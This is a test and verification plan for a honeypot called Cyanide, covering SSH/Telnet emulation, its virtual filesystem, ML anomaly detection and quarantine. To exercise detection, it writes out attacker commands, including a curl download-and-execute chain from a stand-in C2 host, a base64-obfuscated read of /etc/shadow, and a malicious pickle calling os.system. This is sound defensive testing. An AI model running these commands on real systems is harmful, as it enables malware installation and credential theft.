# Comprehensive Feature Verification Plan (Cyanide)

This guide provides a granular breakdown of how to test every major internal module and feature of the project.

---

## 1. Core Framework (Honeypot Logic)

### 1.1 SSH Emulation (`src/cyanide/core/server.py`)
- **Test Case**: Multi-architecture connection.
- **Method**: Connect from different clients (OpenSSH, Paramiko, PuTTY).
- **Validation**: Verify that the KEX algorithm negotiation and server fingerprinting match the OS profile.

### 1.2 Telnet Logic (`src/cyanide/services/telnet_handler.py`)
- **Test Case**: Interactive login.
- **Method**: `telnet localhost 2223`.
- **Validation**: Pass standard character-at-a-time (IAC) options. Verify command echoing works without double characters.

### 1.3 SFTP Support (`src/cyanide/core/sftp.py`)
- **Test Case**: Remote file browsing.
- **Method**: Use an SFTP client (e.g., FileZilla or `sftp -P 2222 root@localhost`).
- **Validation**: List directories, attempt to upload/download a file. Verify that uploads are handled by the `QuarantineService`.

---

## 2. Virtual Filesystem (VFS) & Shell

### 2.1 Node System (`src/cyanide/vfs/nodes.py`)
- **Test Case**: Permission enforcement.
- **Method**: Attempt to `cat /root/secret` as a non-root user.
- **Validation**: Verify "Permission denied" error is returned, identical to a real Linux shell.

### 2.2 Provider & Initialization (`src/cyanide/vfs/provider.py`)
- **Test Case**: Stochastic aging.
- **Method**: Inspect multiple folders (e.g., `/usr/bin`, `/etc`).
- **Validation**: Confirm that files have different `mtime` values within a reasonable range from the `install_date`, not a single uniform value.

### 2.3 Command Logic (`src/cyanide/vfs/commands/`)
- **Test Case**: Piped complexity.
- **Method**: `cat /etc/passwd | head -n 5 | tail -n 1 | awk -F: '{print $1}'`.
- **Validation**: Verify absolute correctness of string processing through multiple pipes.
- **Test Case**: `curl` simulation.
- **Method**: `curl -v http://1.1.1.1`.
- **Validation**: Verify that HTTP headers and "IP resolution" output look realistic.

---

## 3. Analytics & ML Engines

### 3.1 Tokenization (`src/cyanide/ml/tokenizer.py`)
- **Test Case**: Character-level encoding.
- **Method**: Use `scripts/management/analyze_threshold.py`.
- **Validation**: Verify that non-ASCII characters or excessive special characters don't crash the tokenizer.

### 3.2 Anomaly Classification (`src/cyanide/ml/model.py`)
- **Test Case**: Threshold sensitivity.
- **Method**: Run a known safe sequence vs. an unusual one (e.g., mass download + execution).
- **Validation**: The MSE (Mean Squared Error) for the unusual sequence must be significantly higher than the `threshold` defined in `app.yaml`.

### 3.3 Rule Engine (`src/cyanide/ml/rule_engine.py`)
- **Test Case**: Static pattern matching.
- **Method**: Execute a command containing a known malicious URL (e.g., `pastebin.com/raw/exploits`).
- **Validation**: Verify immediate detection and tagging in the JSON log.

---

## 4. Security & Forensics

### 4.1 Restricted Unpickler (`src/cyanide/core/security.py`)
- **Test Case**: Exploit prevention.
- **Method**: Craft a malicious pickle file that tries to execute `os.system` and try to load it via `security.load()`.
- **Validation**: Must raise `pickle.UnpicklingError` with the message "Safe class detected".

### 4.2 Quarantine Flow (`src/cyanide/services/quarantine.py`)
- **Test Case**: Malware capture.
- **Method**: Upload any file via SFTP or `scp`.
- **Validation**: File must be moved to `var/lib/cyanide/quarantine/`, renamed with a UUID, and a VirusTotal scan task should be queued (if API key is present).

### 4.3 Audit Logging (`src/cyanide/logger.py`)
- **Test Case**: Event serialization.
- **Method**: Trigger various events (login, command, file access).
- **Validation**: Open `var/log/cyanide/cyanide.json` and ensure all JSON objects are valid and contain the original IP/username/session ID.

---

## 5. System Health

### 5.1 Prometheus Exporter
- **Test Case**: Metric accuracy.
- **Method**: Perform 5 connection attempts.
- **Validation**: Refresh `/metrics` and check if `honeypot_connections_total` incremented by exactly 5.

### 5.2 Performance Under Load
- **Test Case**: Connection limits.
- **Method**: Use a tool like `nmap` or a custom script to open 50 concurrent SSH connections.
- **Validation**: Verify the `VMPool` or `SessionManager` handles limits gracefully without leaking memory or crashing the main event loop.

---

## 6. System-Level Integration Scenarios

### 6.1 The "Shadow Stealer" Attack Chain
- **Scenario**: Attacker logs in, attempts to escalate, and reads sensitive files.
- **Flow**: `ssh` -> `id` -> `sudo su -` -> `cat /etc/shadow` -> `ls -la /root`.
- **Verify**: Correct prompt transitions (`$` to `#`), realistic audit logs for each step, and final `CRITICAL_ALERT` event in the JSON log.

### 6.2 The "Botnet Dropper" Scenario
- **Scenario**: Automata tries to download a script and execute it.
- **Flow**: `ssh` -> `curl http://cnc.io/bot.sh > /tmp/bot.sh` -> `chmod +x /tmp/bot.sh` -> `./tmp/bot.sh`.
- **Verify**: `curl` simulation success, VFS permission updates for `chmod`, and `ML_ANOMALY` detection for the unusual execution pattern.

---

## 7. Configuration & Environment Resilience

### 7.1 Malformed Configuration
- **Test**: Remove a mandatory field (e.g., `os_profile`) from `cyanide.cfg`.
- **Verify**: The server should either fallback to safe defaults or exit with a clear error message in the console before starting services.

### 7.2 Broken Profile Logic
- **Test**: Point `os_profile` to a non-existent YAML file or a corrupt YAML.
- **Verify**: `ShellEmulator` should catch the loading error and provide a fallback "Generic Linux" environment to allow the session to remain active.

---

## 8. Aesthetic & UX Verification

### 8.1 Fastfetch-Style Startup (`src/cyanide/core/aesthetics.py`)
- **Visual Check**: Run the app locally.
- **Verify**: ASCII logo is correctly aligned, information fields (OS, Hostname, Ports) are color-coded (bold green/yellow), and the layout isn't broken by long paths.

### 8.2 Shell Interactivity
- **Feel Check**: Use `ssh` and press `Tab` or `Up Arrow`.
- **Verify**: Tab completion (if implemented/simulated) and command history buffer feel responsive and don't leak "real" host escape codes to the attacker's TTY.

---

## 9. Connectivity & Network Robustness

### 9.1 Connection Persistence
- **Test**: Keep a session open for 1 hour without sending commands.
- **Verify**: Server respect `session_timeout` and disconnects the user exactly as configured.

### 9.2 Port Conflict Management
- **Test**: Run another service on port 2222 and then start Cyanide.
- **Verify**: Clean error handling ("Address already in use") and graceful exits for specifically failed services without hanging.

---

## 10. Intelligence & External Integrations

### 10.1 MITRE ATT&CK Mapping (`src/cyanide/ml/rule_engine.py`)
- **Test**: Execute a command with a known technique (e.g., `crontab -e` for Persistence).
- **Verify**: The resulting log entry in `cyanide.json` MUST contain the correct MITRE technique ID (e.g., `T1053`).

### 10.2 VirusTotal Robustness (`src/cyanide/core/vt_scanner.py`)
- **Test Case**: API Failure handling.
- **Method**: Set an invalid API key and upload a file.
- **Verify**: The server must log the API error but NOT crash or block the user's SFTP session. The file should still be quarantined locally.

---

## 11. Stress & Chaos Testing

### 11.1 Disk Full Simulation
- **Scenario**: `var/lib/cyanide` partition is full.
- **Verify**: How the `QuarantineService` behaves when it can't save a file. It should skip the save and log a critical error without crashing the main loop.

### 11.2 Signal Stress
- **Scenario**: Send `SIGINT` (Ctrl+C) while multiple sessions are active and a file upload is in progress.
- **Verify**: Server must wait briefly or immediately clean up PIDs and sockets before exit, ensuring no zombie processes are left.

---

## 12. Performance Benchmarking

### 12.1 ML Filter Latency
- **Test Case**: Command execution overhead with ML enabled.
- **Method**: Run a loop of 100 simple commands (e.g., `id`) and measure total execution time with `ml.enabled: true` vs `ml.enabled: false`.
- **Validation**: Overhead per command should stay within acceptable limits (e.g., < 50ms) to ensure the honeypot feels responsive to an interactive attacker.

### 12.2 Concurrent Session Impact
- **Test Case**: Resource scaling.
- **Method**: Monitor CPU and Memory usage while linearly increasing concurrent SSH sessions from 1 to 50.
- **Validation**: No exponential growth in resource consumption; linear scaling is expected based on the `VMPool` architecture.

---

## 13. Fuzzing & Input Robustness

### 13.1 VFS Path Fuzzing
- **Test Case**: Extreme path depths and characters.
- **Method**: Attempt to access paths with 1024+ characters, non-UTF8 sequences, and nested symlink loops (if supported).
- **Validation**: VFS should return standard "File name too long" or "Too many levels of symbolic links" errors without crashing the internal provider or causing a stack overflow.

### 13.2 Shell Input Fuzzing
- **Test Case**: Malformed control characters.
- **Method**: Send sequences like `\0`, `\x01`, and raw binary blobs to the shell prompt.
- **Validation**: The emulator should filter or escape these characters, preventing attacker escape from the virtual TTY to the host environment.

---

## 14. Evasion Testing (Adversarial ML)

### 14.1 Command Obfuscation
- **Test Case**: Encoded execution.
- **Method**: Run `bash -c "$(echo Y2F0IC9ldGMvc2hhZG93 | base64 -d)"`.
- **Validation**: The `AnalyticsService` must flag this as an anomaly even if the individual components (`echo`, `base64`) are permitted.

### 14.2 Padding & Whitespace
- **Test Case**: Signature evasion.
- **Method**: Add 1000 spaces between a command and its arguments: `cat          /etc/shadow`.
- **Validation**: Check if the tokenizer correctly handles/strips excessive whitespace to maintain consistent detection features.

---

## 15. Lifecycle & State Management

### 15.1 State Leakage (Multi-Session)
- **Test Case**: Session poisoning.
- **Method**: Session A writes to `/tmp/exploit`. Session B attempts to read `/tmp/exploit`.
- **Verify**: Correct behavior depends on configuration:
    - *Global VFS*: Session B sees the file.
    - *Per-Session VFS*: Session B MUST NOT see the file.

### 15.2 Cleanup Reliability (`src/cyanide/core/cleanup.py`)
- **Test Case**: Retention enforcement.
- **Method**: Create files with old timestamps (e.g., `touch -d "10 days ago" var/log/test.log`) and triggers cleanup.
- **Verify**: Files older than `retention_days` are unlinked, while newer logs remain intact. Confirm no "critical" project files in `src/` or `configs/` are targeted.

---

## 16. Security Boundary Checklist
- [ ] NO command can execute a real `subprocess.run` on the host.
- [ ] NO file operation can `unlink` or `write` outside the virtual root (Path Traversal).
- [ ] NO ML model loading occurs without the `RestrictedUnpickler`.
